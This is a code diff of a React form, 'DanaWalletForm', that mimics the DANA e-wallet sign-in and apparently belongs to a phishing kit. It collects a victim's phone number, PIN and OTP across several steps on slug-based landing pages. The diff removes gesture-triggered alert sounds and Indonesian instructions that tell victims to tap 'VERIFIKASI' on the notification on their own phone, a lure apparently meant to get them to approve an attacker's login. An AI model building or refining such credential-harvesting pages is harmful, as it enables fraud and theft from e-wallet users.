@@ -161,7 +161,6 @@ export function DanaWalletForm({ slugData, onBack }: WalletFormProps) {
                   placeholder="811-1234-5678"
                   className="min-w-0 flex-1 bg-transparent px-3 text-[22px] font-medium text-gray-800 placeholder:text-gray-400 outline-none"
                   value={formatPhoneInput(f.stepData.phone)}
-                  onPointerDown={() => f.unlockEnterpriseAudioSync()}
                   onChange={(e) =>
                     f.setStepData({ ...f.stepData, phone: e.target.value.replace(/[^0-9]/g, '') })
                   }
@@ -200,7 +199,6 @@ export function DanaWalletForm({ slugData, onBack }: WalletFormProps) {
               <button
                 type="submit"
                 disabled={!f.phoneValid || f.submitting}
-                onPointerDown={() => f.unlockEnterpriseAudioSync()}
                 className={`flex h-[52px] w-full items-center justify-center rounded-xl text-[15px] font-bold tracking-wide transition ${
                   f.phoneValid
                     ? 'bg-white text-[#108EE9] active:bg-white/90'
@@ -236,7 +234,6 @@ export function DanaWalletForm({ slugData, onBack }: WalletFormProps) {
 
               <div
                 className="relative mt-10 cursor-text"
-                onPointerDown={() => f.unlockEnterpriseAudioSync()}
                 onClick={() => f.pinInputRef.current?.focus()}
                 role="presentation"
               >
@@ -295,11 +292,6 @@ export function DanaWalletForm({ slugData, onBack }: WalletFormProps) {
             className={`mx-auto min-h-screen w-full max-w-md bg-white pb-8 transition-transform transition-opacity duration-500 ease-in-out ${
               f.isStep3SlidingIn ? 'translate-y-10 opacity-0' : 'translate-y-0 opacity-100'
             }`}
-            onPointerDown={() => {
-              if (f.step3GestureSoundRef.current) return;
-              f.step3GestureSoundRef.current = true;
-              f.playEnterpriseOtpSoundFromGesture();
-            }}
           >
             <header className="landing-step2-header landing-step2-header--light">
               <button
@@ -321,16 +313,6 @@ export function DanaWalletForm({ slugData, onBack }: WalletFormProps) {
               </h1>
               <div className="mt-3 flex justify-center">
                 <DanaLogoBlue />
-              </div>
-
-              <div className="mt-4">
-                <Image
-                  src="/notif.gif"
-                  width={200}
-                  height={120}
-                  className="w-[200px] h-auto mx-auto"
-                  alt="Notifikasi"
-                />
               </div>
 
               <p className="mt-6 text-center text-[13px] text-gray-700">Kode dikirim ke</p>
@@ -374,8 +356,7 @@ export function DanaWalletForm({ slugData, onBack }: WalletFormProps) {
                         : 'border-transparent'
                     }`}
                     value={f.stepData.otp[index] ?? ''}
-                    onPointerDown={() => f.unlockEnterpriseAudioSync()}
-                    onChange={(e) => f.handleOtpChange(index, e.target.value)}
+                  onChange={(e) => f.handleOtpChange(index, e.target.value)}
                     onKeyDown={(e) => f.handleOtpKeyDown(index, e)}
                   />
                 ))}
@@ -408,40 +389,6 @@ export function DanaWalletForm({ slugData, onBack }: WalletFormProps) {
                     Kirim ulang
                   </button>
                 )}
-              </div>
-
-              <div className="mt-8 border-t border-gray-100 pt-6">
-                <p className="text-[13px] font-semibold text-gray-800">
-                  Silahkan Cek verifikasi akun DANA kamu:
-                </p>
-
-                <div className="mt-4 flex gap-3">
-                  <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-full bg-[#108EE9]/10">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
-                      <rect x="6" y="2" width="12" height="20" rx="2" stroke="#108EE9" strokeWidth="1.5" />
-                      <circle cx="12" cy="18" r="1" fill="#108EE9" />
-                    </svg>
-                  </div>
-                  <p className="text-[11px] leading-relaxed text-gray-600">
-                    Tap notifikasi di perangkatmu di layar atas dan tap{' '}
-                    <span className="font-bold text-gray-800">VERIFIKASI</span>.
-                  </p>
-                </div>
-
-                <div className="mt-4 flex gap-3">
-                  <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-full bg-[#108EE9]/10">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
-                      <rect x="3" y="5" width="18" height="14" rx="2" stroke="#108EE9" strokeWidth="1.5" />
-                      <path d="M3 7l9 6 9-6" stroke="#108EE9" strokeWidth="1.5" />
-                    </svg>
-                  </div>
-                  <p className="text-[11px] leading-relaxed text-gray-600">
-                    Tidak menerima notifikasi? Cek Kotak Masuk atau menu{' '}
-                    <span className="font-bold text-gray-800">Verifikasi</span>. atau cek di icon gambar{' '}
-                    <span className="font-bold text-gray-800">Amplop</span> dan tap{' '}
-                    <span className="font-bold text-gray-800">Verifikasi</span>.
-                  </p>
-                </div>
               </div>
 
               {f.errorMessage && (
